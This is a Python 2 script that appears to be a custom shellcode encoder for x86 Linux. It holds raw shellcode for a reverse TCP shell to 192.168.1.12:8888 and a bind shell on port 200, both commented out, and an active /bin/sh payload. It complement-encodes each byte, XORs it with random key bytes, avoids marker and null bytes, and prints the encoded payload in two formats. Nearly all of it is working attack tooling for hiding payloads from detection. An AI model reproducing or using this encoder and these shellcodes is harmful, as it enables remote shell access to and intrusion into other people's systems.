#!/usr/bin/python

import random

#reverse tcp shell shellcode 192.168.1.12:8888
#shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\xb8\xff\xff\xff\xff\x52\x52\x35\x3f\x57\xfe\xf3\x50\xb8\xff\xff\xff\xff\x66\x35\xdd\x47\x66\x50\x66\x6a\x02\x89\xe1\xb2\x10\x89\xf3\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x27\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf8\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x55\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x07\xcd\x80")

#bind shell shellcode port: 200 use sudo to run
#shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x52\x52\x52\xb8\xff\xff\xff\xff\x66\x35\xff\x37\x66\x50\x66\x6a\x02\x89\xe1\xb2\x10\x89\xf3\x31\xc0\x66\xb8\x69\x01\xcd\x80\x31\xc0\x89\xf3\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x89\xf3\x31\xc9\x89\xca\x89\xc6\x66\xb8\x6c\x01\xcd\x80\x31\xdb\x89\xc3\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x55\x89\xe1\xb0\x0b\xcd\x80")

#/bin/sh shellcode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


#create a random marker or use a specific one like 0xbb if the payload is too big
markerKey = random.randint(1,255)
marker1 = '\\x%02x' % markerKey
marker2 = '0x%02x' % markerKey
#marker1 = '\\xbb'
#marker2 = '0xbb'



encoded = ""
encoded2 = ""

complementShellCode = ""

def create_shellcode():
        
        global encoded
        global encoded2
        global complementShellCode

        print 'Encoding shellcode ...'

        byteArr = bytearray(shellcode)


        for x in byteArr :

                randnum = random.randint(1,255)
                randbyte1 = '\\x%02x' % randnum
                randbyte2 = '0x%02x,' % randnum
                encoded += randbyte1
                encoded2 += randbyte2
                complementShellCode += randbyte2

                x = (~x) & 0xff #Complement Encoding
                
                encoded += '\\x'
                encoded += '%02x' %(x^randnum)


                encoded2 += '0x'
                encoded2 += '%02x,' % (x^randnum)

                #fill the array of complement encoding
                complementShellCode += '0x'
                complementShellCode += '%02x,' % x                

                

def cleanAndRetry():
    global encoded
    encoded = ""
    global encoded2
    encoded2 = ""
    global complementShellCode
    complementShellCode = ""
    create_shellcode()


create_shellcode()
#encoded2 += marker2 + marker2#test string
#encoded2 += '0x00'#test string

#search if marker exists in our shell code
markerFound = True
while markerFound :
    if (complementShellCode.find(marker2) == -1):
        print "complement shellcode doesn't contains the marker, shellcode is fine continue\n"        
        if (encoded2.find(marker2) == -1):
            print "XORed shellcode doesn't contains the marker, shellcode is fine continue\n"

            if (encoded2.find('0x00') == -1):
                print "shellcode doesn't contains null chars, shellcode is fine \n"
                markerFound = False
            else:
                print "shellcode contains null chars, re-calculate \n"
                cleanAndRetry()

        else:
            print 'XORed shellcode contains the marker, re-calculate \n'
            cleanAndRetry()

    else:
        print 'complement shellcode contains the marker, re-calculate \n'
        cleanAndRetry()

    

encoded += marker1

encoded2 += marker2


#print "complementShellCode"
#print complementShellCode

print encoded
print '\nMarker: ' + marker1 + '\n'
print encoded2
print '\nMarker: ' + marker2 + '\n'


#print 'Len: %d' % len(bytearray(shellcode))
